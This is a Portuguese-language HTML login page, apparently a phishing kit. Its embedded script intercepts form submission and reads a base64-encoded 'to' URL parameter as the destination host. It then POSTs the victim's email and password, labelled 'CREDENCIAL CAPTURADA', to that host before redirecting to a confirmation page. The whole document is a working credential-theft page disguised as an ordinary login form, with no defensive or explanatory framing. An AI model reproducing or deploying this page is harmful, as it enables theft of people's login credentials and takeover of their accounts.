<!DOCTYPE html>
<html lang="pt-br">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulário de Login</title>
</head>

<body>
  <form id="form-login">
    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required><br>
    <label for="senha">Senha:</label>
    <input type="password" id="senha" name="senha" required><br>
    <input type="submit" value="Login">
  </form>

  <script>
    document.getElementById('form-login').addEventListener('submit', function (e) {
      e.preventDefault();
      
      // Pega os parametros
      var params = new URLSearchParams(window.location.search);
      
      // Pega o parametro "to" e descriptografa dele de base64
      var destino = atob(params.get('to'));
      
      // Pega o email e senha
      var email = document.getElementById('email').value;
      var senha = document.getElementById('senha').value;
      var data = "####\n\n[🥃 CREDENCIAL CAPTURADA]\nEMAIL: " + email + "\nSENHA: " + senha + "\n\n####\n";

      // Envia os dados para o ip
      fetch('http://'+destino, {
        method: 'POST',
        body: data,
        headers: {
          'Content-Type': 'text/plain'
        }
      })
      .then(response => response.text())
      .then(data => {
        console.log(data);
        window.location.href = "/confirmado.php";
    })
      .catch((error) => console.error('Error:', error));
    });
  </script>
</body>

</html>